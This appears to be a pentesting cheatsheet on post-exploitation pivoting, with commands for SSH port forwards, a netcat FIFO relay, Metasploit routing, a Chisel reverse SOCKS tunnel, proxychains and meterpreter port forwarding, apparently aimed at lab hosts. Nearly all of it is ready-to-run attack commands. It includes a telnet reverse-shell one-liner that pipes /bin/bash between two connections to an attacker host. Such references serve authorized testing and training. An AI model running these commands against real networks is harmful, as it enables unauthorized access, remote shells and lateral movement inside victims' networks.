---
type: cheatsheet
phase: post-exploitation
tags: [pivoting, tunneling, port-forward, lateral-movement, cheatsheet]
source: teamghsoftware/security-cheatsheets (adapted)
---

## What is pivoting
Using a compromised host as a relay to reach internal network segments that you couldn't reach directly. You route your traffic through the compromised host to hit targets behind it.

---

## SSH Tunnels (most reliable method)

**Local port forward** — reach a service on the internal network via your local machine:
```bash
ssh -L <local_port>:<internal_host>:<internal_port> user@<pivot_host>
# e.g. access internal web server at 192.168.1.10:80 via pivot
ssh -L 8080:192.168.1.10:80 jones@nexus.htb
# Now: curl http://127.0.0.1:8080/ → goes to 192.168.1.10:80
```

**Dynamic port forward (SOCKS proxy)** — route all traffic through the pivot:
```bash
ssh -D 1080 user@<pivot_host>
# Configure proxychains to use 127.0.0.1:1080
# Then: proxychains nmap -sT 192.168.1.0/24
```

**Remote port forward** — expose a service from inside to the attacker:
```bash
ssh -R <attacker_port>:localhost:<service_port> user@<attacker_host>
```

---

## Netcat / FIFO backpipe pivot

When SSH isn't available:

```bash
# On pivot host — create a FIFO pipe
mknod /tmp/bp p

# Relay traffic from attacker (port 4444) to internal target (port 80)
nc <internal_host> 80 < /tmp/bp | nc -l -p 4444 > /tmp/bp
```

**Telnet variant (when nc isn't on target):**
```bash
# Terminal 1 on attacker — listen on 80
nc -l -n -v -p 80

# Terminal 2 on attacker — listen on 443
nc -l -n -v -p 443

# On target
telnet <attacker_IP> 80 | /bin/bash | telnet <attacker_IP> 443
```

---

## Metasploit routing

```bash
# After getting a meterpreter session on the pivot host:
meterpreter > run get_local_subnets
meterpreter > background

# Route all traffic to the internal subnet through this session
msf > route add 192.168.1.0 255.255.255.0 <session_id>

# Then use auxiliary modules against internal hosts
msf > use auxiliary/scanner/portscan/tcp
msf > set RHOSTS 192.168.1.0/24
msf > run
```

---

## Chisel (fast HTTP tunnel)

```bash
# On attacker (server mode)
chisel server -p 8080 --reverse

# On victim (client mode — reverse SOCKS proxy)
chisel client <attacker_IP>:8080 R:socks

# Configure proxychains4.conf: socks5 127.0.0.1 1080
# Then: proxychains nmap 192.168.1.1
```

---

## proxychains

```bash
# Edit /etc/proxychains4.conf
# Set: socks5 127.0.0.1 <port>

# Use with any tool
proxychains nmap -sT -p 80,443,22 192.168.1.10
proxychains curl http://192.168.1.10/
proxychains sqlmap -u http://192.168.1.10/page?id=1
```

---

## Meterpreter port forward

```bash
meterpreter > portfwd add -l 8080 -p 80 -r 192.168.1.10
# Local port 8080 → 192.168.1.10:80
```

## Related
- [[metasploit]]
- [[meterpreter]]
- [[netcat]]
- [[Pentest Privesc Cheatsheet]]
